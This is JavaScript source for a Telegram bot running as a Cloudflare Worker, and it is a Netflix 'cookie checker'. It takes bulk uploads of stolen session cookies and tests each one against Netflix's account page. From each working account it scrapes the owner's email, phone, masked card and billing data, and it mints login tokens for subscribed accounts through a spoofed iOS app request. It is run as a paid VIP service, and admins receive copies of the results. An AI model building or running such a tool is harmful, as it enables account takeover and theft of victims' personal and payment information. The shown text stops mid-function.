import { unzipSync, strFromU8 } from "fflate";

const SUPPORTED_DOCUMENT_EXTENSIONS = new Set([".txt", ".json", ".zip", ".7z", ".rar"]);
const SUPPORTED_COOKIE_EXTENSIONS = new Set([".txt", ".json"]);
const REQUIRED_COOKIES = ["NetflixId"];
const OPTIONAL_COOKIES = ["SecureNetflixId", "nfvdid", "OptanonConsent"];
const COOKIE_NAMES = [...REQUIRED_COOKIES, ...OPTIONAL_COOKIES];
const CANONICAL_COOKIE_NAMES = new Map(COOKIE_NAMES.map((name) => [name.toLowerCase(), name]));
const TELEGRAM_LIMIT = 4096;
const PREVIEW_LIMIT = 3400;
const REPORT_SEPARATOR = "=".repeat(60);
const HIT_SEPARATOR_WIDTH = 50;
const DEFAULT_REPORT_FILENAME = "results.txt";
const DEFAULT_OWNER_USERNAME = "@terousd";
const DEFAULT_ADMIN_CHAT_IDS = ["6712205222"];
const DEFAULT_FREE_MAX_COOKIES_PER_SCAN = 100;
const DEFAULT_FREE_DAILY_SCAN_LIMIT = 2;
const DEFAULT_FREE_SCAN_COOLDOWN_MS = 30 * 60 * 1000;
const DEFAULT_FREE_LIMIT_TIME_ZONE = "Asia/Dhaka";
const DEFAULT_SCANNER_HANDLE = "@terousd_netflixchk_bot";
const DEFAULT_RESULT_CAPTION = `Scanned by : ${DEFAULT_SCANNER_HANDLE}`;
const CHECK_BUTTON_CALLBACK = "scan:arm";
const SCAN_STATE_TTL_MS = 15 * 60 * 1000;
const COMMAND_SYNC_INTERVAL_MS = 6 * 60 * 60 * 1000;
const NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48";
const NFTOKEN_QUERY_PARAMS = {
  appVersion: "15.48.1",
  config: '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
  device_type: "NFAPPL-02-",
  esn: "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
  idiom: "phone",
  iosVersion: "15.8.5",
  isTablet: "false",
  languages: "en-US",
  locale: "en-US",
  maxDeviceWidth: "375",
  model: "saget",
  modelType: "IPHONE8-1",
  odpAware: "true",
  path: '["account","token","default"]',
  pathFormat: "graph",
  pixelDensity: "2.0",
  progressive: "false",
  responseFormat: "json",
};
const NFTOKEN_HEADERS = {
  "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
  "x-netflix.request.attempt": "1",
  "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
  "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
  "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
  "x-netflix.context.app-version": "15.48.1",
  "x-netflix.argo.translated": "true",
  "x-netflix.context.form-factor": "phone",
  "x-netflix.context.sdk-version": "2012.4",
  "x-netflix.client.appversion": "15.48.1",
  "x-netflix.context.max-device-width": "375",
  "x-netflix.context.ab-tests": "",
  "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
  "x-netflix.client.type": "argo",
  "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
  "x-netflix.context.locales": "en-US",
  "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
  "x-netflix.client.iosversion": "15.8.5",
  "accept-language": "en-US;q=1",
  "x-netflix.argo.abtests": "",
  "x-netflix.context.os-version": "15.8.5",
  "x-netflix.request.client.context": '{"appState":"foreground"}',
  "x-netflix.context.ui-flavor": "argo",
  "x-netflix.argo.nfnsm": "9",
  "x-netflix.context.pixel-density": "2.0",
  "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
  "x-netflix.request.client.timezoneid": "Asia/Dhaka",
};

const DEFAULT_COUNTS = {
  hits: 0,
  free: 0,
  bad: 0,
  duplicate: 0,
  on_hold: 0,
  errors: 0,
};

let botCommandSyncPromise = null;
let lastBotCommandSyncAt = 0;

export default {
  async fetch(request, env, ctx) {
    if (request.method === "GET") {
      return new Response("Netflix checker Telegram Worker is online.\n", {
        headers: { "content-type": "text/plain; charset=utf-8" },
      });
    }

    if (request.method !== "POST") {
      return new Response("Method not allowed", { status: 405 });
    }

    const expectedSecret = env.WEBHOOK_SECRET || "";
    const receivedSecret = request.headers.get("x-telegram-bot-api-secret-token") || "";
    if (expectedSecret && receivedSecret !== expectedSecret) {
      return new Response("Unauthorized", { status: 401 });
    }

    let update;
    try {
      update = await request.json();
    } catch {
      return new Response("Bad request", { status: 400 });
    }

    ctx.waitUntil(ensureBotCommands(env).catch((error) => console.error("Could not sync Telegram commands", error)));
    ctx.waitUntil(
      handleUpdate(update, env).catch((error) => notifyUpdateError(update, env, error))
    );
    return new Response("OK");
  },
  async queue(batch, env, ctx) {
    for (const message of batch.messages) {
      ctx.waitUntil(processQueuedTask(message.body, env).catch((error) => console.error(error)));
    }
  },
};

async function handleUpdate(update, env) {
  if (update.callback_query) {
    await handleCallbackQuery(update.callback_query, env);
    return;
  }

  const message = update.message || update.edited_message || update.channel_post;
  if (!message || !message.chat) {
    return;
  }

  const chatId = message.chat.id;
  const actorId = message.from?.id || chatId;
  const access = await getAccessStatus(env, chatId, actorId);
  const command = parseBotCommand(message.text);

  if (command) {
    await handleCommand(env, chatId, actorId, access, command);
    return;
  }

  const hasText = Boolean(message.text && message.text.trim());
  const hasDocument = Boolean(message.document);
  if (!hasText && !hasDocument) {
    return;
  }

  const scanGate = await accessRequest(env, "/consume-scan", { chatId, actorId });
  if (!scanGate.ok || !scanGate.armed) {
    return;
  }

  if (message.document) {
    await handleDocumentMessage(env, chatId, message.document, scanGate);
    return;
  }

  if (hasText) {
    const trimmedText = message.text.trim();
    if (!looksLikeCookieText(trimmedText)) {
      await sendMessage(env, chatId, "Send pasted Netflix cookie text or upload a cookie file.");
      return;
    }
    const progressMessage = await sendMessage(env, chatId, "Starting...");
    const inputFiles = [{ name: "message.txt", text: trimmedText + "\n" }];
    await runAndSend(env, chatId, inputFiles, progressMessage.result?.message_id, "message.txt", scanGate);
  }
}

async function handleCommand(env, chatId, actorId, access, command) {
  switch (command.name) {
    case "start":
      await sendStartMessage(env, chatId, access);
      return;
    case "id":
    case "myid":
      await sendStartMessage(env, chatId, access);
      return;
    case "add":
    case "allow":
      if (!access.isAdminActor) {
        await sendStartMessage(env, chatId, access);
        return;
      }
      await handleAllowCommand(env, chatId, actorId, command.args);
      return;
    case "del":
    case "delete":
    case "remove":
    case "revoke":
      if (!access.isAdminActor) {
        await sendStartMessage(env, chatId, access);
        return;
      }
      await handleRevokeCommand(env, chatId, actorId, command.args[0]);
      return;
    case "list":
    case "users":
      if (!access.isAdminActor) {
        await sendStartMessage(env, chatId, access);
        return;
      }
      await handleListCommand(env, chatId, actorId);
      return;
    case "status":
    case "user":
      if (!access.isAdminActor) {
        await sendStartMessage(env, chatId, access);
        return;
      }
      await handleCheckCommand(env, chatId, actorId, command.args[0], command.name);
      return;
    case "check":
      if (access.isAdminActor && normalizeId(command.args[0])) {
        await handleCheckCommand(env, chatId, actorId, command.args[0], "check");
        return;
      }
      await armScanMode(env, chatId, actorId);
      return;
    case "help":
      await sendStartMessage(env, chatId, access, buildHelpMessage(access));
      return;
    default:
      await sendStartMessage(env, chatId, access, buildHelpMessage(access));
  }
}

async function handleCallbackQuery(callbackQuery, env) {
  const message = callbackQuery.message;
  const chatId = message?.chat?.id;
  const actorId = callbackQuery.from?.id;
  if (!chatId || !actorId) {
    if (callbackQuery.id) {
      await answerCallbackQuery(env, callbackQuery.id);
    }
    return;
  }

  const access = await getAccessStatus(env, chatId, actorId);
  if (callbackQuery.data === CHECK_BUTTON_CALLBACK) {
    const result = await armScanMode(env, chatId, actorId);
    if (!result.ok) {
      await answerCallbackQuery(env, callbackQuery.id, result.error || "Could not start scan mode.", true);
      return;
    }
    await answerCallbackQuery(env, callbackQuery.id, "Send your cookie file or pasted cookies now.");
    return;
  }

  await answerCallbackQuery(env, callbackQuery.id);
}

async function handleAllowCommand(env, chatId, actorId, args) {
  const parsed = parseApprovedUserArgs(args);
  const targetId = parsed.targetId;
  if (!targetId) {
    await sendMessage(env, chatId, "Usage: /add <user_id> [name] [@username]");
    return;
  }

  const result = await accessRequest(env, "/allow", {
    actorId,
    targetId,
    name: parsed.name,
    username: parsed.username,
  });
  await sendMessage(
    env,
    chatId,
    result.ok
      ? `VIP access enabled for ${targetId}${parsed.name ? ` (${parsed.name})` : ""}${parsed.username ? ` ${parsed.username}` : ""}.`
      : result.error || "Could not add that account right now."
  );
}

async function handleRevokeCommand(env, chatId, actorId, rawTargetId) {
  const targetId = normalizeId(rawTargetId);
  if (!targetId) {
    await sendMessage(env, chatId, "Usage: /del <account_id>");
    return;
  }

  const result = await accessRequest(env, "/revoke", { actorId, targetId });
  await sendMessage(
    env,
    chatId,
    result.ok
      ? `VIP access removed for ${targetId}.`
      : result.error || "Could not remove that account right now."
  );
}

async function handleListCommand(env, chatId, actorId) {
  const result = await accessRequest(env, "/list", { actorId });
  if (!result.ok) {
    await sendMessage(env, chatId, result.error || "Could not load the VIP list.");
    return;
  }

  const lines = [
    "VIP Access List",
    "",
    `Admins: ${result.adminIds.length ? result.adminIds.join(", ") : "None"}`,
    `Approved users: ${result.allowedUsers.length}`,
  ];

  if (result.allowedUsers.length) {
    lines.push("");
    for (const user of result.allowedUsers) {
      const parts = [user.chatId];
      if (user.name) parts.push(user.name);
      if (user.username) parts.push(user.username);
      if (user.addedBy) parts.push(`by ${user.addedBy}`);
      if (user.addedAt) parts.push(user.addedAt);
      lines.push(parts.join(" | "));
    }
  }

  await sendLongMessage(env, chatId, lines.join("\n"));
}

async function handleCheckCommand(env, chatId, actorId, rawTargetId, commandName = "status") {
  const targetId = normalizeId(rawTargetId);
  if (!targetId) {
    await sendMessage(env, chatId, `Usage: /${commandName} <user_id>`);
    return;
  }

  const result = await accessRequest(env, "/check", { actorId, targetId, chatId: targetId });
  if (!result.ok) {
    await sendMessage(env, chatId, result.error || "Could not check that account.");
    return;
  }

  const lines = [
    `Account ID: ${targetId}`,
    `Status: ${result.allowed ? "VIP access active" : "VIP access required"}`,
  ];
  if (result.record?.name) lines.push(`Name: ${result.record.name}`);
  if (result.record?.username) lines.push(`Username: ${result.record.username}`);
  if (result.record?.addedBy) lines.push(`Added by: ${result.record.addedBy}`);
  if (result.record?.addedAt) lines.push(`Added at: ${result.record.addedAt}`);
  await sendMessage(env, chatId, lines.join("\n"));
}

async function armScanMode(env, chatId, actorId) {
  const result = await accessRequest(env, "/arm-scan", { chatId, actorId });
  if (!result.ok) {
    await sendMessage(env, chatId, result.error || "Could not start scan mode.");
    return result;
  }

  const lines = [];
  if (!result.allowed) {
    lines.push(buildFreeTierNotice(result.freeLimits, result.freeUsage), "");
  }
  lines.push("Send your cookie file or pasted cookies now.");
  await sendMessage(env, chatId, lines.join("\n"));
  return result;
}

function buildStartMessage(access) {
  const lines = [`Your account ID: ${access.chatId}`];
  if (String(access.actorId) !== String(access.chatId)) {
    lines.push(`Your user ID: ${access.actorId}`);
  }
  lines.push(
    `Status: ${access.isAdminActor ? "Admin access active" : access.allowed ? "VIP access active" : "Free access active"}`
  );

  if (access.allowed) {
    lines.push("", "Send /check or tap Check, then send pasted cookie text or upload a .txt, .json, or .zip file.");
  } else {
    lines.push("", buildFreeTierNotice(access.freeLimits, access.freeUsage));
    lines.push(`Ask ${access.ownerUsername} to approve this account ID for VIP access.`);
  }

  if (access.isAdminActor) {
    lines.push("", "Admin commands:", "/add <user_id> [name] [@username]", "/remove <user_id>", "/list", "/status <user_id>");
  }

  return lines.join("\n");
}

function buildHelpMessage(access) {
  const lines = [
    buildStartMessage(access),
    "",
    "Cloudflare Worker support:",
    "- Pasted text",
    "- .txt, .json, .zip",
    "- .7z and .rar are not unpacked here",
  ];
  return lines.join("\n");
}

async function sendStartMessage(env, chatId, access, text = undefined) {
  const message = text || buildStartMessage(access);
  const replyMarkup = buildStartReplyMarkup(access);
  return sendMessage(env, chatId, message, undefined, { replyMarkup });
}

function buildStartReplyMarkup(access) {
  if (access.allowed) {
    return {
      inline_keyboard: [[{ text: "Check", callback_data: CHECK_BUTTON_CALLBACK }]],
    };
  }

  const username = String(access.ownerUsername || DEFAULT_OWNER_USERNAME).replace(/^@/, "");
  return {
    inline_keyboard: [
      [{ text: "Check", callback_data: CHECK_BUTTON_CALLBACK }],
      [{ text: "Get VIP Access", url: `https://t.me/${username}` }],
    ],
  };
}

function parseBotCommand(text) {
  if (!text || typeof text !== "string") return null;
  const trimmed = text.trim();
  if (!trimmed.startsWith("/")) return null;

  const parts = trimmed.split(/\s+/);
  const token = parts.shift() || "";
  const name = token.slice(1).split("@")[0].toLowerCase();
  return { name, args: parts };
}

async function handleDocumentMessage(env, chatId, document, scanGate) {
  const filename = sanitizeFilename(document.file_name || "upload.txt");
  const extension = getExtension(filename);
  if (!SUPPORTED_DOCUMENT_EXTENSIONS.has(extension)) {
    await sendMessage(env, chatId, "Unsupported file. Send .txt, .json, .zip, .7z, or .rar.");
    return;
  }

  const maxFileBytes = Number(env.MAX_FILE_BYTES || 30000000);
  if (document.file_size && document.file_size > maxFileBytes) {
    await sendMessage(env, chatId, `File is too large. Limit is ${Math.floor(maxFileBytes / 1024 / 1024)} MB.`);
    return;
  }

  const progressMessage = await sendMessage(env, chatId, "Starting...");

  try {
    const bytes = await downloadTelegramFile(env, document.file_id);
    const inputFiles = await importUpload(filename, bytes, env);
    if (!inputFiles.length) {
      await sendMessage(env, chatId, "No .txt or .json cookie files were found to check.");
      return;
    }
    await runAndSend(env, chatId, inputFiles, progressMessage.result?.message_id, filename, scanGate);
  } catch (error) {
    await sendMessage(env, chatId, `Error: ${error.message || String(error)}`);
  }
}

async function runAndSend(env, chatId, inputFiles, progressMessageId = null, reportFilename = null, scanGate = null) {
  const sourceFiles = inputFiles.map((file) => file.name);
  const outputFilename = sanitizeFilename(reportFilename || sourceFiles[0] || DEFAULT_REPORT_FILENAME);
  const tasks = [];
  let taskIndex = 0;
  for (const file of inputFiles) {
    const bundles = extractNetflixCookieBundles(file.text);
    if (!bundles.length) {
      tasks.push({ kind: "missing_cookies", fileName: file.name, label: file.name, taskIndex: taskIndex++ });
      continue;
    }
    for (const bundle of bundles) {
      const label = bundles.length > 1 ? `${file.name} [${bundle.index}/${bundles.length}]` : file.name;
      tasks.push({ kind: "bundle", fileName: file.name, label, bundle, taskIndex: taskIndex++ });
    }
  }

  if (!tasks.length) {
    if (progressMessageId) {
      await editMessageText(env, chatId, progressMessageId, "No .txt or .json cookie files were found to check.");
    }
    return;
  }

  if (scanGate && !scanGate.allowed) {
    const limits = scanGate.freeLimits || getFreeScanLimits(env);
    if (tasks.length > limits.maxCookies) {
      await sendOrEditMessage(
        env,
        chatId,
        progressMessageId,
        [
          `Free users can scan up to ${limits.maxCookies} cookies at a time.`,
          `This upload has ${tasks.length} cookies. Send ${limits.maxCookies} or fewer, or get VIP access.`,
        ].join("\n")
      );
      return;
    }

    const freeScan = await accessRequest(env, "/record-free-scan", {
      chatId,
      actorId: scanGate.actorId || chatId,
      cookieCount: tasks.length,
    });
    if (!freeScan.ok) {
      await sendOrEditMessage(env, chatId, progressMessageId, freeScan.error || "Free scan limit reached.");
      return;
    }
  }

  const jobId = crypto.randomUUID();
  const stub = getJobStub(env, jobId);
  const initResult = await jobRequest(stub, "/init", {
    jobId,
    chatId,
    messageId: progressMessageId,
    sourceFiles,
    reportFilename: outputFilename,
    total: tasks.length,
  });
  if (progressMessageId) {
    await editMessageText(env, chatId, progressMessageId, `<pre>${escapeHtml(initResult.progressText)}</pre>`, "HTML");
  }

  for (const chunk of chunkArray(tasks.map((task) => ({ jobId, task })), 100)) {
    await env.CHECK_QUEUE.sendBatch(chunk.map((item) => ({ body: item })));
  }
}

function buildProgressLine({ counts, checked, processed }) {
  const valid = counts.hits + counts.free;
  const left = Math.max(0, checked - processed);
  return [
    `Checking ${processed}/${checked}`,
    `Left ${left}`,
    `Valid ${valid}`,
    `Good ${counts.hits}`,
    `Free ${counts.free}`,
    `Bad ${counts.bad}`,
    `Dup ${counts.duplicate}`,
    `Err ${counts.errors}`,
  ].join(" | ");
}

function buildTerminalOutput({ counts, planCounts, planLabels, checked, processed = checked, logLines }) {
  const valid = counts.hits + counts.free;
  const left = Math.max(0, checked - processed);
  const lines = [
    "Netflix Checker - Cloudflare Mode",
    `Progress: ${processed}/${checked} | Left: ${left}`,
    "",
    "Plan Counts",
    `Premium: ${planCounts.premium || 0}`,
    `Standard: ${planCounts.standard || 0}`,
    `Standard With Ads: ${planCounts.standard_with_ads || 0}`,
    `Basic: ${planCounts.basic || 0}`,
    `Mobile: ${planCounts.mobile || 0}`,
    `Free: ${counts.free || 0}`,
  ];

  for (const [key, value] of Object.entries(planCounts)) {
    if (!["premium", "standard", "standard_with_ads", "basic", "mobile", "free"].includes(key)) {
      lines.push(`${planLabels[key] || formatPlanLabel(key)}: ${value}`);
    }
  }

  lines.push(
    "",
    "Status",
    `Valid: ${valid}`,
    `Good : ${counts.hits}`,
    `Free : ${counts.free}`,
    `Bad  : ${counts.bad}`,
    `Dup  : ${counts.duplicate}`,
    `OnHold: ${counts.on_hold}`,
    `Err  : ${counts.errors}`,
    ""
  );

  if (logLines.length) {
    lines.push("Log", ...logLines, "");
  }

  lines.push("Finished Checking", "Press enter to exit");
  return lines.join("\n");
}

async function processQueuedTask(payload, env) {
  const task = payload?.task || {};
  const jobId = payload?.jobId;
  if (!jobId) return;

  const stub = getJobStub(env, jobId);

  if (task.kind === "missing_cookies") {
    await recordQueuedOutcome(stub, env, {
      taskIndex: task.taskIndex,
      resultType: "failed",
      reason: "missing required cookies",
      label: task.label || task.fileName,
      fileName: task.fileName,
    });
    return;
  }

  const cookies = task.bundle?.cookies || {};
  if (!hasRequiredCookies(cookies)) {
    await recordQueuedOutcome(stub, env, {
      taskIndex: task.taskIndex,
      resultType: "failed",
      reason: "missing required cookies",
      label: task.label || task.fileName,
      fileName: task.fileName,
    });
    return;
  }

  let responseText = "";
  let statusCode = 0;
  let info = {};
  let resultType = "failed";
  let reason = null;
  let country = null;
  let planName = null;
  let planKey = null;
  let onHold = false;
  let duplicateKey = null;
  let nftokenData = null;

  try {
    const page = await getAccountPage(cookies, env);
    responseText = page.text;
    statusCode = page.status;
    info = page.info || {};
  } catch (error) {
    const reasonText = /abort|timeout/i.test(String(error?.name || "") + " " + String(error?.message || ""))
      ? "timeout"
      : "proxy error";
    await recordQueuedOutcome(stub, env, {
      taskIndex: task.taskIndex,
      resultType: "error",
      reason: reasonText,
      label: task.label || task.fileName,
      fileName: task.fileName,
    });
    return;
  }

  if (statusCode === 200 && responseText) {
    if (info.countryOfSignup && info.countryOfSignup !== "null") {
      const isSubscribed = isSubscribedAccount(info);
      duplicateKey = String(info.email || info.userGuid || "").trim().toLowerCase() || cookies.NetflixId;
      const plan = deriveOutputPlanBucket(info, isSubscribed);
      planKey = plan.planKey;
      planName = plan.displayLabel;
      country = info.countryOfSignup;
      onHold = isSubscribed && isOnHoldAccount(info);

      if (isSubscribed) {
        resultType = "success";
        nftokenData = await createNftoken(cookies, env).catch(() => null);
      } else {
        resultType = "free";
      }
    } else {
      resultType = "failed";
      reason = "incomplete account page";
    }
  } else if ([403, 429, 500, 502, 503, 504].includes(statusCode)) {
    resultType = "error";
    reason = describeHttpError(statusCode);
  } else {
    resultType = "failed";
    reason = "incomplete account page";
  }

  await recordQueuedOutcome(stub, env, {
    taskIndex: task.taskIndex,
    resultType,
    reason,
    label: task.label || task.fileName,
    fileName: task.fileName,
    country,
    planName,
    planKey,
    onHold,
    duplicateKey,
    info,
    netscapeContent: task.bundle?.netscapeText || "",
    nftokenData: nftokenData || {},
  });
}

async function recordQueuedOutcome(stub, env, outcome) {
  const update = await jobRequest(stub, "/record", outcome);
  if (update.shouldNotify && update.messageId) {
    await editMessageText(env, update.chatId, update.messageId, `<pre>${escapeHtml(update.progressText)}</pre>`, "HTML");
  }
  if (update.completed && update.report && update.chatId) {
    const reportFilename = update.reportFilename || DEFAULT_REPORT_FILENAME;
    await sendDocument(env, update.chatId, reportFilename, update.report, getResultCaption(env));
    await sendAdminResultCopies(env, update.chatId, update.report, reportFilename);
  }
}

function formatStatus(status, cookieFile, country = null, plan = null, reason = null) {
  const basePath = `cookies\\${cookieFile}`;
  const details = [];
  if (country) details.push(`Country: ${country}`);
  if (plan) details.push(`Plan: ${plan}`);
  const detailText = details.length ? ` [${details.join(" | ")}]` : "";

  if (status === "success") {
    return `> Login successful with ${basePath}${detailText}. Moved to output folder!`;
  }
  if (status === "free") {
    return `> Login successful with ${basePath}${detailText}. But no active subscription. Moved to output\\Free folder!`;
  }
  if (status === "duplicate") {
    return `> Duplicate email found with ${basePath}. Moved to output\\Duplicate folder!`;
  }
  if (status === "error") {
    const reasonText = reason ? ` Reason: ${reason}.` : "";
    return `> Error occurred with ${basePath}.${reasonText} Moved to broken folder!`;
  }
  const reasonText = reason ? ` Reason: ${reason}.` : "";
  return `> Login failed with ${basePath}.${reasonText} Moved to failed folder!`;
}

async function getAccountPage(cookies, env) {
  const cookieHeader = Object.entries(cookies)
    .filter(([, value]) => value)
    .map(([key, value]) => `${key}=${value}`)
    .join("; ");
  const headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept-Encoding": "identity",
    Cookie: cookieHeader,
  };
  const response = await fetchWithTimeout("https://www.netflix.com/account/membership", {
    headers,
    redirect: "follow",
  }, Number(env.NETFLIX_REQUEST_TIMEOUT_MS || 15000));
  const text = await response.text();
  const info = response.status === 200 ? extractInfo(text) : {};
  return { status: response.status, text, info };
}

async function fetchWithTimeout(url, options, timeoutMs) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort("timeout"), timeoutMs);
  try {
    return await fetch(url, { ...options, signal: controller.signal });
  } finally {
    clearTimeout(timer);
  }
}

function extractInfo(responseText) {
  const graphqlInfo = extractInfoFromGraphqlPayload(responseText);
  let extracted;
  if (hasCompleteAccountInfo(graphqlInfo)) {
    extracted = { ...graphqlInfo };
  } else {
    extracted = {
      accountOwnerName: extractFirstMatch(responseText, [
        /userInfo"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"/,
        /"accountOwnerName"\s*:\s*"([^"]+)"/,
        /"firstName"\s*:\s*"([^"]+)"/,
      ]),
      email: extractFirstMatch(responseText, [
        /"emailAddress"\s*:\s*"([^"]+)"/,
        /"email"\s*:\s*"([^"]+)"/,
        /"loginId"\s*:\s*"([^"]+)"/,
      ]),
      countryOfSignup: extractFirstMatch(responseText, [
        /"currentCountry"\s*:\s*"([^"]+)"/,
        /"countryOfSignup":\s*"([^"]+)"/,
      ]),
      memberSince: extractFirstMatch(responseText, [/"memberSince":\s*"([^"]+)"/]),
      nextBillingDate: extractFirstMatch(responseText, [
        /"GrowthNextBillingDate"\s*,\s*"date"\s*:\s*"([^"T]+)T/,
        /"nextBillingDate"\s*:\s*"([^"]+)"/,
      ]),
      userGuid: extractFirstMatch(responseText, [/"userGuid":\s*"([^"]+)"/]),
      showExtraMemberSection: extractBoolValue(responseText, [
        /"showExtraMemberSection"\s*:\s*(true|false)/i,
      ]),
      membershipStatus: extractFirstMatch(responseText, [/"membershipStatus":\s*"([^"]+)"/]),
      maxStreams: extractFirstMatch(responseText, [
        /"maxStreams"\s*:\s*"?([^",}]+)"?/,
      ]),
      localizedPlanName: extractFirstMatch(responseText, [
        /"currentPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"/,
        /"nextPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"/,
        /"localizedPlanName"\s*:\s*"([^"]+)"/,
        /"planName"\s*:\s*"([^"]+)"/,
      ]),
      planPrice: extractFirstMatch(responseText, [
        /"formattedPlanPrice"\s*:\s*"([^"]+)"/,
        /"formattedPrice"\s*:\s*"([^"]+)"/,
        /"displayPrice"\s*:\s*"([^"]+)"/,
        /"planPrice"\s*:\s*"([^"]+)"/,
      ]),
      paymentMethodType: extractFirstMatch(responseText, [
        /"paymentMethod"\s*:\s*"([^"]+)"/,
        /"paymentType"\s*:\s*"([^"]+)"/,
        /"paymentMethodType"\s*:\s*"([^"]+)"/,
      ]),
      maskedCard: extractFirstMatch(responseText, [
        /"__typename"\s*:\s*"GrowthCardPaymentMethod"[\s\S]*?"displayText"\s*:\s*"([^"]+)"/,
        /"paymentCardDisplayString"\s*:\s*"([^"]+)"/,
        /"paymentMethodLast4"\s*:\s*"([^"]+)"/,
        /"lastFour"\s*:\s*"([^"]+)"/,
      ]),
      phoneNumber: extractFirstMatch(responseText, [
        /"phoneNumberDigits"\s*:\s*\{[\s\S]*?"value"\s*:\s*"([^"]+)"/,
        /"phoneNumber"\s*:\s*"([^"]+)"/,
      ]),
      phoneVerified: extractBoolValue(responseText, [
        /"phoneVerified"\s*:\s*(true|false)/i,
        /"isPhoneVerified"\s*:\s*(true|false)/i,
      ]),
      videoQuality: extractFirstMatch(responseText, [
        /"videoQuality"\s*:\s*"([^"]+)"/,
        /"quality"\s*:\s*"([^"]+)"/,
      ]),
      holdStatus: extractBoolValue(responseText, [
        /"holdStatus"\s*:\s*(true|false)/i,
        /"isUserOnHold"\s*:\s*(true|false)/i,
        /"isOnHold"\s*:\s*(true|false)/i,
        /"pastDue"\s*:\s*(true|false)/i,
      ]),
      emailVerified: extractBoolValue(responseText, [
        /"emailVerified"\s*:\s*(true|false)/i,
        /"isEmailVerified"\s*:\s*(true|false)/i,
      ]),
      profiles: extractProfileNames(responseText),
    };
    extracted = mergeInfo(graphqlInfo, extracted);
  }

  if (!extracted.paymentMethodType) extracted.paymentMethodType = null;
  if (!extracted.holdStatus) {
    const statusKey = normalizePlanKey(extracted.membershipStatus);
    if (statusKey === "current_member") extracted.holdStatus = "No";
    if (/(hold|past_due|payment_retry|paused|suspend)/.test(statusKey)) extracted.holdStatus = "Yes";
  }
  if (!extracted.emailVerified && extracted.email) extracted.emailVerified = "Yes";
  extracted.phoneDisplay = normalizePhoneNumber(extracted.phoneNumber, extracted.countryOfSignup);
  if (extracted.profiles) {
    const names = extracted.profiles.split(", ").filter(Boolean);
    extracted.profileCount = names.length;
    extracted.profilesDisplay = extracted.profiles;
  }
  return extracted;
}

function extractInfoFromGraphqlPayload(text) {
  let payload;
  try {
    payload = JSON.parse(text);
  } catch {
    return {};
  }
  const data = payload && payload.data;
  if (!data || typeof data !== "object") return {};

  const growthAccount = data.growthAccount || {};
  const currentProfile = data.currentProfile || {};
  const currentPlan = ((growthAccount.currentPlan || {}).plan || {});
  const nextPlan = ((growthAccount.nextPlan || {}).plan || {});
  const nextBilling = growthAccount.nextBillingDate || {};
  const holdMeta = growthAccount.growthHoldMetadata || {};
  const paymentMethods = Array.isArray(growthAccount.growthPaymentMethods) ? growthAccount.growthPaymentMethods : [];
  const paymentMethod = paymentMethods[0] || {};
  const profiles = Array.isArray(growthAccount.profiles) ? growthAccount.profiles : [];

  let emailValue = null;
  let emailVerified = null;
  const emailFromProfile = getGrowthEmail(currentProfile);
  emailValue = emailFromProfile.email;
  emailVerified = emailFromProfile.verified;
  if (!emailValue) {
    for (const profile of profiles) {
      const found = getGrowthEmail(profile);
      if (found.email) {
        emailValue = found.email;
        emailVerified = found.verified;
        break;
      }
    }
  }

  const profileNames = profiles.map((profile) => decodeNetflixValue(profile.name)).filter(Boolean);
  const featureTypes = [];
  for (const plan of [currentPlan, nextPlan]) {
    for (const feature of plan.availableFeatures || []) {
      if (feature && feature.type) featureTypes.push(String(feature.type).toUpperCase());
    }
  }

  const rawPhone = ((growthAccount.growthLocalizablePhoneNumber || {}).rawPhoneNumber || {});
  const phoneDigitsObj = rawPhone.phoneNumberDigits || {};
  const phoneDigits = typeof phoneDigitsObj === "object" ? phoneDigitsObj.value : phoneDigitsObj;

  const paymentLogo = ((paymentMethod.paymentOptionLogo || {}).paymentOptionLogo);
  const paymentTypename = String(paymentMethod.__typename || "");
  const paymentDisplayText = decodeNetflixValue(paymentMethod.displayText);

  const info = {
    accountOwnerName: decodeNetflixValue(currentProfile.name),
    email: decodeNetflixValue(emailValue),
    countryOfSignup: decodeNetflixValue(((growthAccount.countryOfSignUp || {}).code)),
    memberSince: decodeNetflixValue(growthAccount.memberSince),
    nextBillingDate: decodeNetflixValue(nextBilling.localDate || nextBilling.date),
